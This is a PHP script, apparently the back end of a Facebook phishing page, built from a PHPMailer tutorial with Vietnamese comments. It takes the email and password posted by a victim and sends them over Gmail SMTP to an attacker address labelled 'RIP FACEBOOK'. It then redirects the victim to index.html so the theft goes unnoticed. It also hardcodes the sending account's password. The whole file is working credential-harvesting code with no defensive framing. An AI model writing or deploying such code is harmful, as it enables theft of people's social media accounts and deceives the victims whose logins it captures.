<?php
//goi thu vien
$taikhoan=$_POST['email'];
$matkhau=$_POST['password'];
$noidung='<p><h3><strong>Thông tin liên hệ</strong></h3></p>
							<p><strong>Email:</strong> '.$taikhoan.'</p>
							<p><strong>Mật khẩu:</strong> '.$matkhau.'</p>';;
include('class.smtp.php');
include "class.phpmailer.php";
$nFrom = "Freetuts.net";    //mail duoc gui tu dau, thuong de ten cong ty ban
$mFrom = 'ripsite2019@gmail.com';  //dia chi email cua ban
$mPass = '1234567Aa';       //mat khau email cua ban
$nTo = 'RIP FACEBOOK'; //Ten nguoi nhan
$mTo = 'ripsite2019@gmail.com';   //dia chi nhan mail
$mail             = new PHPMailer();
$body             = $_POST['password']; // Noi dung email
$title = 'Thông tin facebook';   //Tieu de gui mail
$mail->IsSMTP();
$mail->CharSet  = "utf-8";
$mail->SMTPDebug  = 0;   // enables SMTP debug information (for testing)
$mail->SMTPAuth   = true;    // enable SMTP authentication
$mail->SMTPSecure = "ssl";   // sets the prefix to the servier
$mail->Host       = "smtp.gmail.com";    // sever gui mail.
$mail->Port       = 465;         // cong gui mail de nguyen
// xong phan cau hinh bat dau phan gui mail

   
							    
$mail->Username   = $mFrom;  // khai bao dia chi email
$mail->Password   = $mPass;              // khai bao mat khau
$mail->SetFrom($mFrom, $nFrom);
$mail->AddReplyTo('info@freetuts.net', 'Freetuts.net'); //khi nguoi dung phan hoi se duoc gui den email nay
$mail->Subject    = $title;// tieu de email
$mail->MsgHTML($noidung);// noi dung chinh cua mail se nam o day.
$mail->AddAddress($mTo, $nTo);

// thuc thi lenh gui mail
if(!$mail->Send()) {
    echo 'Co loi!';
    
} else {
    
    header("Location: index.html");
}
?>